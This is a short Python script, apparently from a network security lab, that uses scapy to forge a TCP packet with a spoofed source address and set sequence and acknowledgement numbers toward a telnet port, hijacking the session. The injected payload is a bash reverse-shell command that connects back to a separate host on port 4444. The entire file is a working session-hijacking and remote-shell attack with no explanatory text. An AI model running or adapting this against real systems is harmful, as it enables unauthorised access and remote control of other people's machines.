#!/usr/bin/env python3
from scapy.all import IP, TCP, Raw, send

ip = IP(src="10.11.2.5", dst="10.11.2.6")
tcp = TCP(
    sport=58084,
    dport=23,
    flags="PA",
    seq=2546404533,
    ack=2459475786
)

data = b"/bin/bash -i > /dev/tcp/10.11.2.7/4444 0<&1 2>&1\r\n"
pkt = ip / tcp / Raw(data)
send(pkt, verbose=0)